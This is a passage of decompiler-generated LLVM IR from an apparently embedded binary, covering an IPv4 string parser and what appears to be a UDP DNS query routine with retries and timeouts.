  %v2_1000acf43 = load i8, i8* %v1_1000acf42, align 1
  %v3_1000acf44 = zext i8 %v2_1000acf43 to i32
  store i32 %v3_1000acf44, i32* %r11.global-to-local, align 4
  %v3_1000acf86 = icmp eq i8 %v2_1000acf43, 0
  br i1 %v3_1000acf86, label %dec_label_pc_1000ad08, label %dec_label_pc_1000ad00

dec_label_pc_1000acd8:                            ; preds = %dec_label_pc_1000acdc
  %v3_1000acdc = zext i8 %v2_1000acdc to i32
  %v4_1000ace8 = icmp eq i32 %v3_1000acdc, %v1_1000ace8
  %v0_1000acd8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000ace8, i32 %v0_1000acd8)
  %v0_1000acdc.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ace8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000acdc

dec_label_pc_1000acdc:                            ; preds = %dec_label_pc_1000ad00, %dec_label_pc_1000acd8
  %v1_1000ace8 = phi i32 [ %v1_1000ace89, %dec_label_pc_1000ad00 ], [ %v1_1000ace8.pre, %dec_label_pc_1000acd8 ]
  %v0_1000acdc = phi i32 [ %tmp, %dec_label_pc_1000ad00 ], [ %v0_1000acdc.pre, %dec_label_pc_1000acd8 ]
  %v1_1000acdc = inttoptr i32 %v0_1000acdc to i8*
  %v2_1000acdc = load i8, i8* %v1_1000acdc, align 1
  %v1_1000ace0 = add i32 %v0_1000acdc, 1
  store i32 %v1_1000ace0, i32* %r9.global-to-local, align 4
  %v3_1000ace4 = icmp eq i8 %v2_1000acdc, 0
  br i1 %v3_1000ace4, label %dec_label_pc_1000acf0, label %dec_label_pc_1000acd8

dec_label_pc_1000acf0:                            ; preds = %dec_label_pc_1000acdc
  %v0_1000acf0 = load i32, i32* @r3, align 4
  %v1_1000acf0 = add i32 %v0_1000acf0, 1
  store i32 %v1_1000acf0, i32* @r3, align 4
  %v1_1000acf4 = inttoptr i32 %v1_1000acf0 to i8*
  %v2_1000acf4 = load i8, i8* %v1_1000acf4, align 1
  %v3_1000acf4 = zext i8 %v2_1000acf4 to i32
  store i32 %v3_1000acf4, i32* %r11.global-to-local, align 4
  %v3_1000acf8 = icmp eq i8 %v2_1000acf4, 0
  br i1 %v3_1000acf8, label %dec_label_pc_1000ad08, label %dec_label_pc_1000ad00

dec_label_pc_1000ad00:                            ; preds = %dec_label_pc_1000acd4, %dec_label_pc_1000acf0
  %v1_1000ace89 = phi i32 [ %v3_1000acf4, %dec_label_pc_1000acf0 ], [ %v3_1000acf44, %dec_label_pc_1000acd4 ]
  store i32 %tmp, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000acdc

dec_label_pc_1000ad08:                            ; preds = %dec_label_pc_1000acf0, %dec_label_pc_1000acd4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1000acdc, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000ad00, { 1, 0 }
}

define i32 @function_1000ad10(i8* %arg1) local_unnamed_addr {
dec_label_pc_1000ad10:
  %r5.global-to-local = alloca i32, align 4
  %v3_1000ad10 = icmp eq i8* %arg1, null
  br i1 %v3_1000ad10, label %dec_label_pc_1000adc8, label %dec_label_pc_1000ad18

dec_label_pc_1000ad18:                            ; preds = %dec_label_pc_1000ad10
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1000ad2c.pre = load i32, i32* @global_var_1001044c, align 4
  br label %dec_label_pc_1000ad28

dec_label_pc_1000ad28:                            ; preds = %dec_label_pc_1000ad18, %dec_label_pc_1000ada0
  %v0_1000ada0 = phi i32 [ 0, %dec_label_pc_1000ad18 ], [ %v2_1000ada8, %dec_label_pc_1000ada0 ]
  %v0_1000ada4 = phi i32 [ 1, %dec_label_pc_1000ad18 ], [ %v1_1000ada4, %dec_label_pc_1000ada0 ]
  %v0_1000ad28 = phi i32 [ %tmp, %dec_label_pc_1000ad18 ], [ %v0_1000ad283, %dec_label_pc_1000ada0 ]
  %v1_1000ad28 = inttoptr i32 %v0_1000ad28 to i8*
  %v2_1000ad28 = load i8, i8* %v1_1000ad28, align 1
  %v3_1000ad28 = zext i8 %v2_1000ad28 to i32
  %v1_1000ad30 = mul nuw nsw i32 %v3_1000ad28, 2
  %v2_1000ad34 = add i32 %v1_1000ad30, %v3_1000ad2c.pre
  %v3_1000ad34 = inttoptr i32 %v2_1000ad34 to i16*
  %v4_1000ad34 = load i16, i16* %v3_1000ad34, align 2
  %v1_1000ad38 = and i16 %v4_1000ad34, 8
  %v3_1000ad38 = icmp eq i16 %v1_1000ad38, 0
  br i1 %v3_1000ad38, label %dec_label_pc_1000adc8, label %dec_label_pc_1000ad40

dec_label_pc_1000ad40:                            ; preds = %dec_label_pc_1000ad28
  br label %dec_label_pc_1000ad58

dec_label_pc_1000ad48:                            ; preds = %dec_label_pc_1000ad58
  %v1_1000ad5c = mul i32 %v1_1000ada8, 10
  %v2_1000ad64 = add i32 %v3_1000ad58, %v1_1000ad5c
  %v1_1000ad48 = add i32 %v2_1000ad64, -48
  %v1_1000ad4c = add i32 %v0_1000ad90, 1
  %v2_1000ad50 = icmp sgt i32 %v1_1000ad48, 255
  br i1 %v2_1000ad50, label %dec_label_pc_1000adc8, label %dec_label_pc_1000ad58

dec_label_pc_1000ad58:                            ; preds = %dec_label_pc_1000ad48, %dec_label_pc_1000ad40
  %v1_1000ada8 = phi i32 [ %v1_1000ad48, %dec_label_pc_1000ad48 ], [ 0, %dec_label_pc_1000ad40 ]
  %v0_1000ad90 = phi i32 [ %v1_1000ad4c, %dec_label_pc_1000ad48 ], [ %v0_1000ad28, %dec_label_pc_1000ad40 ]
  %v1_1000ad58 = inttoptr i32 %v0_1000ad90 to i8*
  %v2_1000ad58 = load i8, i8* %v1_1000ad58, align 1
  %v3_1000ad58 = zext i8 %v2_1000ad58 to i32
  %v1_1000ad60 = mul nuw nsw i32 %v3_1000ad58, 2
  %v2_1000ad68 = add i32 %v1_1000ad60, %v3_1000ad2c.pre
  %v3_1000ad68 = inttoptr i32 %v2_1000ad68 to i16*
  %v4_1000ad68 = load i16, i16* %v3_1000ad68, align 2
  %v5_1000ad68 = zext i16 %v4_1000ad68 to i32
  %v1_1000ad6c = and i32 %v5_1000ad68, 8
  %v3_1000ad6c = icmp eq i32 %v1_1000ad6c, 0
  br i1 %v3_1000ad6c, label %dec_label_pc_1000ad74, label %dec_label_pc_1000ad48

dec_label_pc_1000ad74:                            ; preds = %dec_label_pc_1000ad58
  %v2_1000ad74 = icmp sgt i32 %v0_1000ada4, 3
  br i1 %v2_1000ad74, label %dec_label_pc_1000ad8c, label %dec_label_pc_1000ad7c

dec_label_pc_1000ad7c:                            ; preds = %dec_label_pc_1000ad74
  %v3_1000ad7c = icmp eq i8 %v2_1000ad58, 46
  br i1 %v3_1000ad7c, label %dec_label_pc_1000ad84, label %dec_label_pc_1000adc8

dec_label_pc_1000ad84:                            ; preds = %dec_label_pc_1000ad7c
  %v1_1000ad84 = add i32 %v0_1000ad90, 1
  br label %dec_label_pc_1000ada0

dec_label_pc_1000ad8c:                            ; preds = %dec_label_pc_1000ad74
  %v3_1000ad8c = icmp eq i8 %v2_1000ad58, 0
  %v1_1000ad90 = add i32 %v0_1000ad90, 1
  br i1 %v3_1000ad8c, label %dec_label_pc_1000ada0, label %dec_label_pc_1000ad98

dec_label_pc_1000ad98:                            ; preds = %dec_label_pc_1000ad8c
  %v1_1000ad98 = and i32 %v5_1000ad68, 32
  %v3_1000ad98 = icmp eq i32 %v1_1000ad98, 0
  br i1 %v3_1000ad98, label %dec_label_pc_1000adc8, label %dec_label_pc_1000ada0

dec_label_pc_1000ada0:                            ; preds = %dec_label_pc_1000ad98, %dec_label_pc_1000ad8c, %dec_label_pc_1000ad84
  %v0_1000ad283 = phi i32 [ %v1_1000ad90, %dec_label_pc_1000ad98 ], [ %v1_1000ad90, %dec_label_pc_1000ad8c ], [ %v1_1000ad84, %dec_label_pc_1000ad84 ]
  %v1_1000ada0 = mul i32 %v0_1000ada0, 256
  %v1_1000ada4 = add nuw nsw i32 %v0_1000ada4, 1
  %v2_1000ada8 = or i32 %v1_1000ada8, %v1_1000ada0
  store i32 %v2_1000ada8, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_1000ada4, 5
  br i1 %tmp10, label %dec_label_pc_1000ad28, label %dec_label_pc_1000adb4

dec_label_pc_1000adb4:                            ; preds = %dec_label_pc_1000ada0
  %v0_1000adb4 = load i32, i32* @r4, align 4
  %v3_1000adb4 = icmp eq i32 %v0_1000adb4, 0
  %v0_1000adbc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000adb4, i32 %v0_1000adbc)
  %v0_1000adc0 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000adc0 = load i32, i32* @r4, align 4
  %v2_1000adc0 = inttoptr i32 %v1_1000adc0 to i32*
  store i32 %v0_1000adc0, i32* %v2_1000adc0, align 4
  ret i32 1

dec_label_pc_1000adc8:                            ; preds = %dec_label_pc_1000ad7c, %dec_label_pc_1000ad98, %dec_label_pc_1000ad28, %dec_label_pc_1000ad48, %dec_label_pc_1000ad10
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1000ada8, { 1, 0 }
  uselistorder i32 %v1_1000ada4, { 1, 0 }
  uselistorder i32 %v0_1000ad90, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000adc8, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_1000ad28, { 1, 0 }
}

define i32 @function_1000add0(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1000add0:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-212 = alloca i16, align 2
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-228 = alloca i32, align 4
  %v0_1000add4 = load i32, i32* @lr, align 4
  store i32 %v0_1000add4, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r14.global-to-local, align 4
  store i32 512, i32* @r3, align 4
  store i32 %arg2, i32* %r16.global-to-local, align 4
  store i32 %arg3, i32* @r23, align 4
  store i32 268480000, i32* @lr, align 4
  %v0_1000adfc = call i32 @function_100080a0()
  store i32 %v0_1000adfc, i32* @r30, align 4
  store i32 1025, i32* @r3, align 4
  store i32 268480012, i32* @lr, align 4
  %v0_1000ae08 = call i32 @function_100080a0()
  %v0_1000ae0c = load i32, i32* @r30, align 4
  %v3_1000ae0c = icmp eq i32 %v0_1000ae0c, 0
  store i32 %v0_1000ae08, i32* @r21, align 4
  br i1 %v3_1000ae0c, label %dec_label_pc_1000b3c8, label %dec_label_pc_1000ae18

dec_label_pc_1000ae18:                            ; preds = %dec_label_pc_1000add0
  %v3_1000ae18 = icmp eq i32 %v0_1000ae08, 0
  br i1 %v3_1000ae18, label %dec_label_pc_1000b3c8, label %dec_label_pc_1000ae20

dec_label_pc_1000ae20:                            ; preds = %dec_label_pc_1000ae18
  %v0_1000ae20 = load i32, i32* @r23, align 4
  %v3_1000ae20 = icmp eq i32 %v0_1000ae20, 0
  br i1 %v3_1000ae20, label %dec_label_pc_1000b3c8, label %dec_label_pc_1000ae28

dec_label_pc_1000ae28:                            ; preds = %dec_label_pc_1000ae20
  %v0_1000ae28 = load i32, i32* %r14.global-to-local, align 4
  %v1_1000ae28 = inttoptr i32 %v0_1000ae28 to i8*
  %v2_1000ae28 = load i8, i8* %v1_1000ae28, align 1
  %v3_1000ae28 = zext i8 %v2_1000ae28 to i32
  store i32 %v3_1000ae28, i32* %r0.global-to-local, align 4
  %v3_1000ae2c = icmp eq i8 %v2_1000ae28, 0
  br i1 %v3_1000ae2c, label %dec_label_pc_1000b3c8, label %dec_label_pc_1000ae34

dec_label_pc_1000ae34:                            ; preds = %dec_label_pc_1000ae28
  store i32 %v0_1000ae28, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r29.global-to-local, align 4
  %v0_1000ae3c = call i32 @function_10007288()
  %v0_1000ae44 = load i32, i32* %r14.global-to-local, align 4
  %v2_1000ae44 = add i32 %v0_1000ae44, %v0_1000ae3c
  %v1_1000ae4c = add i32 %v2_1000ae44, -1
  %v2_1000ae4c = inttoptr i32 %v1_1000ae4c to i8*
  %v3_1000ae4c = load i8, i8* %v2_1000ae4c, align 1
  %v4_1000ae4c = zext i8 %v3_1000ae4c to i32
  store i32 %v4_1000ae4c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10012b0c.306 to i32), i32* %r29.global-to-local, align 4
  %v2_1000ae54 = ptrtoint i32* %stack_var_-228 to i32
  store i32 %v2_1000ae54, i32* %r28.global-to-local, align 4
  store i32 %v2_1000ae54, i32* @r3, align 4
  %v1_1000ae60 = xor i32 %v4_1000ae4c, 46
  store i32 %v1_1000ae60, i32* %r17.global-to-local, align 4
  %v0_1000ae64 = call i32 @function_10009200()
  %v0_1000ae6c = call i32 @function_100091f8()
  %v3_1000ae74 = load i32, i32* @global_var_100104c4.307, align 4
  store i32 %v3_1000ae74, i32* %r11.global-to-local, align 4
  %v3_1000ae80 = load i16, i16* @global_var_100103dc.308, align 2
  %v4_1000ae80 = zext i16 %v3_1000ae80 to i32
  store i32 %v4_1000ae80, i32* @r25, align 4
  %v1_1000ae84 = load i32, i32* @r23, align 4
  store i32 %v2_1000ae54, i32* @r3, align 4
  store i32 0, i32* %r17.global-to-local, align 4
  store i32 -1, i32* @r19, align 4
  store i32 0, i32* %r18.global-to-local, align 4
  store i32 -1, i32* @r22, align 4
  %v2_1000ae84 = srem i32 %v3_1000ae74, %v1_1000ae84
  %v2_1000aea0 = sub i32 %v3_1000ae74, %v2_1000ae84
  store i32 %v2_1000aea0, i32* %r0.global-to-local, align 4
  store i32 %v2_1000ae84, i32* @r26, align 4
  %v0_1000aea8 = call i32 @function_10009200()
  %v0_1000b3bc.pr19 = load i32, i32* %r18.global-to-local, align 4
  %tmp57 = icmp ult i32 %v0_1000b3bc.pr19, 3
  br i1 %tmp57, label %dec_label_pc_1000aeb0.lr.ph.lr.ph, label %dec_label_pc_1000b3d4

dec_label_pc_1000aeb0.lr.ph.lr.ph:                ; preds = %dec_label_pc_1000ae34
  %v2_1000aec8 = ptrtoint i32* %stack_var_-144 to i32
  %v2_1000afdc = ptrtoint i32* %stack_var_-204 to i32
  %v2_1000b03c = ptrtoint i16* %stack_var_-212 to i32
  %v2_1000b080 = ptrtoint i32* %stack_var_-248 to i32
  %v3_1000b0dc = icmp eq i32 %tmp37, 0
  %v3_1000b0e8 = icmp eq i32 %tmp36, 3
  %v2_1000b164 = icmp sgt i32 %tmp35, 0
  %tmp58 = icmp slt i32 %tmp35, 1
  %v2_1000b1b8 = ptrtoint i32* %stack_var_-184 to i32
  %v3_1000b1e4 = icmp eq i32 %tmp33, 0
  %v3_1000b158 = icmp eq i32 %tmp36, 0
  br label %dec_label_pc_1000aeb0.lr.ph

dec_label_pc_1000aeb0:                            ; preds = %dec_label_pc_1000aeb0.lr.ph, %dec_label_pc_1000b060
  %v0_1000aeb0 = load i32, i32* @r19, align 4
  %v3_1000aeb0 = icmp eq i32 %v0_1000aeb0, -1
  br i1 %v3_1000aeb0, label %dec_label_pc_1000aec0, label %dec_label_pc_1000aeb8

dec_label_pc_1000aeb8:                            ; preds = %dec_label_pc_1000aeb0
  store i32 268480192, i32* @lr, align 4
  %v1_1000aebc = call i32 @function_10004ab4(i32 %v0_1000aeb0)
  br label %dec_label_pc_1000aec0

dec_label_pc_1000aec0:                            ; preds = %dec_label_pc_1000aeb0, %dec_label_pc_1000aeb8
  store i32 %v2_1000aec8, i32* %r29.global-to-local, align 4
  %v0_1000aecc = load i32, i32* @r30, align 4
  store i32 268480212, i32* @lr, align 4
  %v3_1000aed0 = call i32 @function_100071a4(i32 %v0_1000aecc, i32 0, i32 512)
  store i32 268480228, i32* @lr, align 4
  %v3_1000aee0 = call i32 @function_100071a4(i32 %v2_1000aec8, i32 0, i32 48)
  %v0_1000aee4 = load i32, i32* @r25, align 4
  %v1_1000aee4 = add i32 %v0_1000aee4, 1
  %v1_1000aee8 = urem i32 %v1_1000aee4, 65536
  store i32 %v1_1000aee8, i32* @r25, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000aef4 = load i32, i32* @r30, align 4
  store i32 %v1_1000aee8, i32* %stack_var_-144, align 4
  %v4_1000af08 = call i32 @function_1000c814(i32* nonnull %stack_var_-144, i32 %v0_1000aef4, i32 512)
  store i32 %v4_1000af08, i32* %r28.global-to-local, align 4
  %v1_1000af0c = icmp slt i32 %v4_1000af08, 0
  br i1 %v1_1000af0c, label %dec_label_pc_1000b3d4, label %dec_label_pc_1000af14

dec_label_pc_1000af14:                            ; preds = %dec_label_pc_1000aec0
  %v0_1000af14 = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_1000af14, i32* @r4, align 4
  %v0_1000af1c = load i32, i32* @r21, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r29.global-to-local, align 4
  store i32 268480296, i32* @lr, align 4
  %v4_1000af24 = call i32 @function_10007418(i32 %v0_1000af1c, i32 %v0_1000af14, i32 1025)
  store i32 ptrtoint (i32* @global_var_100103e0.261 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1000ae54, i32* @r3, align 4
  %v0_1000af3c = call i32 @function_10009200()
  %v0_1000af44 = call i32 @function_100091f8()
  %v0_1000af48 = load i32, i32* @r22, align 4
  %v1_1000af48 = icmp slt i32 %v0_1000af48, 0
  %v0_1000af50 = load i32, i32* @r26, align 4
  %v1_1000af50 = mul i32 %v0_1000af50, 4
  store i32 %v1_1000af50, i32* %r0.global-to-local, align 4
  %v2_1000af54 = add i32 %v1_1000af50, %arg4
  %v3_1000af54 = inttoptr i32 %v2_1000af54 to i32*
  %v4_1000af54 = load i32, i32* %v3_1000af54, align 4
  store i32 %v4_1000af54, i32* %r29.global-to-local, align 4
  br i1 %v1_1000af48, label %dec_label_pc_1000af9c, label %dec_label_pc_1000af5c

dec_label_pc_1000af5c:                            ; preds = %dec_label_pc_1000af14
  %v3_1000af60 = load i32, i32* @global_var_100104cc.310, align 4
  store i32 %v3_1000af60, i32* %r0.global-to-local, align 4
  %v2_1000af64 = icmp slt i32 %v0_1000af48, %v3_1000af60
  br i1 %v2_1000af64, label %dec_label_pc_1000af6c, label %dec_label_pc_1000af9c

dec_label_pc_1000af6c:                            ; preds = %dec_label_pc_1000af5c
  store i32 ptrtoint (i32* @global_var_1000f898.311 to i32), i32* @r4, align 4
  %v0_1000af78 = load i32, i32* @r21, align 4
  store i32 268480384, i32* @lr, align 4
  %v4_1000af7c = inttoptr i32 %v0_1000af78 to i8*
  %v5_1000af7c = call i32 @function_1000c008(i8* %v4_1000af7c, i32 ptrtoint (i32* @global_var_1000f898.311 to i32), i32 1025, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_1000af84 = load i32, i32* @r22, align 4
  %v1_1000af84 = mul i32 %v0_1000af84, 4
  store i32 %v1_1000af84, i32* %r0.global-to-local, align 4
  %v2_1000af8c = add i32 %v1_1000af84, ptrtoint (i32* @global_var_10012d3c.312 to i32)
  %v3_1000af8c = inttoptr i32 %v2_1000af8c to i32*
  %v4_1000af8c = load i32, i32* %v3_1000af8c, align 4
  store i32 %v4_1000af8c, i32* @r4, align 4
  %v0_1000af90 = load i32, i32* @r21, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000af9c.313 to i32), i32* @lr, align 4
  %v4_1000af98 = inttoptr i32 %v0_1000af90 to i8*
  %v5_1000af98 = call i32 @function_1000c008(i8* %v4_1000af98, i32 %v4_1000af8c, i32 1025, i32 ptrtoint (i32* @global_var_10012d3c.312 to i32))
  br label %dec_label_pc_1000af9c

dec_label_pc_1000af9c:                            ; preds = %dec_label_pc_1000af5c, %dec_label_pc_1000af14, %dec_label_pc_1000af6c
  store i32 %v2_1000ae54, i32* @r3, align 4
  %v0_1000afa4 = call i32 @function_10009200()
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000afb0 = load i32, i32* @r30, align 4
  %v1_1000afb0 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000afb0 = add i32 %v1_1000afb0, %v0_1000afb0
  %v1_1000afb4 = sub i32 512, %v1_1000afb0
  %v0_1000afbc = load i32, i32* @r21, align 4
  store i32 %v0_1000afbc, i32* %stack_var_-240, align 4
  store i32 268480456, i32* @lr, align 4
  %v4_1000afc4 = call i32 @function_1000c9c4(i32* nonnull %stack_var_-240, i32 %v2_1000afb0, i32 %v1_1000afb4)
  store i32 %v4_1000afc4, i32* @r27, align 4
  %v1_1000afc8 = icmp slt i32 %v4_1000afc4, 0
  br i1 %v1_1000afc8, label %dec_label_pc_1000b3d4, label %dec_label_pc_1000afd0

dec_label_pc_1000afd0:                            ; preds = %dec_label_pc_1000af9c
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1000afd8 = load i32, i32* @r29, align 4
  store i16 2, i16* %stack_var_-212, align 2
  store i32 268480488, i32* @lr, align 4
  %v3_1000afe4 = inttoptr i32 %v0_1000afd8 to i8*
  %v4_1000afe4 = call i32 @function_1000c204(i32 10, i8* %v3_1000afe4, i32 %v2_1000afdc)
  %tmp59 = icmp slt i32 %v4_1000afe4, 1
  br i1 %tmp59, label %dec_label_pc_1000aff8thread-pre-split, label %dec_label_pc_1000aff0

dec_label_pc_1000aff0:                            ; preds = %dec_label_pc_1000afd0
  store i32 10, i32* %r0.global-to-local, align 4
  store i16 10, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1000aff8

dec_label_pc_1000aff8thread-pre-split:            ; preds = %dec_label_pc_1000afd0
  %v3_1000aff8.pr = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1000aff8

dec_label_pc_1000aff8:                            ; preds = %dec_label_pc_1000aff8thread-pre-split, %dec_label_pc_1000aff0
  %v3_1000aff8 = phi i16 [ %v3_1000aff8.pr, %dec_label_pc_1000aff8thread-pre-split ], [ 10, %dec_label_pc_1000aff0 ]
  %v3_1000affc = icmp eq i16 %v3_1000aff8, 10
  store i32 53, i32* %r0.global-to-local, align 4
  br i1 %v3_1000affc, label %dec_label_pc_1000b024, label %dec_label_pc_1000b010

dec_label_pc_1000b010:                            ; preds = %dec_label_pc_1000aff8
  %v0_1000b014 = load i32, i32* @r29, align 4
  store i32 268480544, i32* @lr, align 4
  %v1_1000b01c = call i32 @function_10007b20(i32 %v0_1000b014)
  %v3_1000b024.pre = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1000b024

dec_label_pc_1000b024:                            ; preds = %dec_label_pc_1000aff8, %dec_label_pc_1000b010
  %v3_1000b024 = phi i16 [ 10, %dec_label_pc_1000aff8 ], [ %v3_1000b024.pre, %dec_label_pc_1000b010 ]
  %v4_1000b024 = sext i16 %v3_1000b024 to i32
  store i32 268480564, i32* @lr, align 4
  %v3_1000b030 = call i32 @function_1000806c(i32 %v4_1000b024, i32 2, i32 17)
  store i32 %v3_1000b030, i32* @r19, align 4
  %v1_1000b034 = icmp slt i32 %v3_1000b030, 0
  br i1 %v1_1000b034, label %dec_label_pc_1000b060, label %dec_label_pc_1000b03c

dec_label_pc_1000b03c:                            ; preds = %dec_label_pc_1000b024
  store i32 268480584, i32* @lr, align 4
  %v3_1000b044 = call i32 @function_10007f54(i32 %v2_1000b03c, i32 28, i32 28)
  %tmp60 = icmp sgt i32 %v3_1000b044, -1
  br i1 %tmp60, label %dec_label_pc_1000b068, label %dec_label_pc_1000b050

dec_label_pc_1000b050:                            ; preds = %dec_label_pc_1000b03c
  %v0_1000b050 = call i32 @function_10004e38()
  %v1_1000b054 = inttoptr i32 %v0_1000b050 to i32*
  %v2_1000b054 = load i32, i32* %v1_1000b054, align 4
  store i32 %v2_1000b054, i32* %r0.global-to-local, align 4
  %v3_1000b058 = icmp eq i32 %v2_1000b054, 101
  br i1 %v3_1000b058, label %dec_label_pc_1000b3a0, label %dec_label_pc_1000b060

dec_label_pc_1000b060:                            ; preds = %dec_label_pc_1000b050, %dec_label_pc_1000b024
  %v0_1000b060 = load i32, i32* %r18.global-to-local, align 4
  %v1_1000b060 = add i32 %v0_1000b060, 1
  store i32 %v1_1000b060, i32* %r18.global-to-local, align 4
  %tmp61 = icmp ult i32 %v1_1000b060, 3
  br i1 %tmp61, label %dec_label_pc_1000aeb0, label %dec_label_pc_1000b3d4

dec_label_pc_1000b068:                            ; preds = %dec_label_pc_1000b03c
  %v0_1000b068 = load i32, i32* @r28, align 4
  %v1_1000b068 = load i32, i32* @r27, align 4
  %v2_1000b068 = add i32 %v1_1000b068, %v0_1000b068
  %v0_1000b06c = load i32, i32* @r30, align 4
  %v0_1000b074 = load i32, i32* @r19, align 4
  store i32 ptrtoint (i32* @global_var_1000b07c.315 to i32), i32* @lr, align 4
  %v4_1000b078 = call i32 @function_1000b798(i32 %v0_1000b074, i32 %v0_1000b06c, i32 %v2_1000b068, i32 0)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000b090 = load i32, i32* @r19, align 4
  store i32 %v0_1000b090, i32* %stack_var_-248, align 4
  store i32 268480664, i32* @lr, align 4
  %v3_1000b094 = call i32 @function_1000bb28(i32 %v2_1000b080, i32 1, i32 10000)
  %tmp62 = icmp slt i32 %v3_1000b094, 1
  br i1 %tmp62, label %dec_label_pc_1000b3a0, label %dec_label_pc_1000b0a0

dec_label_pc_1000b0a0:                            ; preds = %dec_label_pc_1000b068
  %v0_1000b0a0 = load i32, i32* @r19, align 4
  %v0_1000b0a4 = load i32, i32* @r30, align 4
  store i32 268480692, i32* @lr, align 4
  %v4_1000b0b0 = call i32 @function_10007fb8(i32 %v0_1000b0a0, i32 %v0_1000b0a4, i32 512, i32 0)
  store i32 %v4_1000b0b0, i32* @r27, align 4
  %tmp63 = icmp slt i32 %v4_1000b0b0, 12
  br i1 %tmp63, label %dec_label_pc_1000b348, label %dec_label_pc_1000b0c0

dec_label_pc_1000b0c0:                            ; preds = %dec_label_pc_1000b0a0
  %v0_1000b0c0 = load i32, i32* @r30, align 4
  %v2_1000b0c8 = inttoptr i32 %v0_1000b0c0 to i8*
  %v3_1000b0c8 = call i32 @function_1000c900(i8* %v2_1000b0c8, i32 %v2_1000aec8)
  %v3_1000b0cc = load i32, i32* %stack_var_-144, align 4
  store i32 %v3_1000b0cc, i32* @r20, align 4
  %v1_1000b0d0 = load i32, i32* @r25, align 4
  %v4_1000b0d0 = icmp eq i32 %v3_1000b0cc, %v1_1000b0d0
  br i1 %v4_1000b0d0, label %dec_label_pc_1000b0d8, label %dec_label_pc_1000b348

dec_label_pc_1000b0d8:                            ; preds = %dec_label_pc_1000b0c0
  store i32 %tmp37, i32* %r0.global-to-local, align 4
  br i1 %v3_1000b0dc, label %dec_label_pc_1000b348, label %dec_label_pc_1000b0e4

dec_label_pc_1000b0e4:                            ; preds = %dec_label_pc_1000b0d8
  store i32 %tmp36, i32* %r0.global-to-local, align 4
  br i1 %v3_1000b0e8, label %dec_label_pc_1000b0f0, label %dec_label_pc_1000b158

dec_label_pc_1000b0f0:                            ; preds = %dec_label_pc_1000b0e4
  %v0_1000b0f0 = load i32, i32* %r17.global-to-local, align 4
  %v3_1000b0f0 = icmp eq i32 %v0_1000b0f0, 0
  br i1 %v3_1000b0f0, label %dec_label_pc_1000b0f8, label %dec_label_pc_1000b14c

dec_label_pc_1000b0f8:                            ; preds = %dec_label_pc_1000b0f0
  store i32 ptrtoint (i32* @global_var_100103e0.261 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1000ae54, i32* %r28.global-to-local, align 4
  store i32 %v2_1000ae54, i32* @r3, align 4
  %v0_1000b114 = call i32 @function_10009200()
  %v0_1000b11c = call i32 @function_100091f8()
  %v3_1000b124 = load i32, i32* @global_var_100104cc.310, align 4
  store i32 %v2_1000ae54, i32* @r3, align 4
  %v1_1000b130 = add i32 %v3_1000b124, -1
  store i32 %v1_1000b130, i32* %r29.global-to-local, align 4
  %v0_1000b134 = call i32 @function_10009200()
  %v0_1000b138 = load i32, i32* @r22, align 4
  %v2_1000b138 = icmp slt i32 %v0_1000b138, %v1_1000b130
  br i1 %v2_1000b138, label %dec_label_pc_1000b140, label %dec_label_pc_1000b14c

dec_label_pc_1000b140:                            ; preds = %dec_label_pc_1000b0f8
  %v1_1000b140 = add i32 %v0_1000b138, 1
  store i32 %v1_1000b140, i32* @r22, align 4
  %v0_1000b144 = load i32, i32* @r20, align 4
  store i32 %v0_1000b144, i32* @r25, align 4
  br label %dec_label_pc_1000b3bcthread-pre-split.backedge

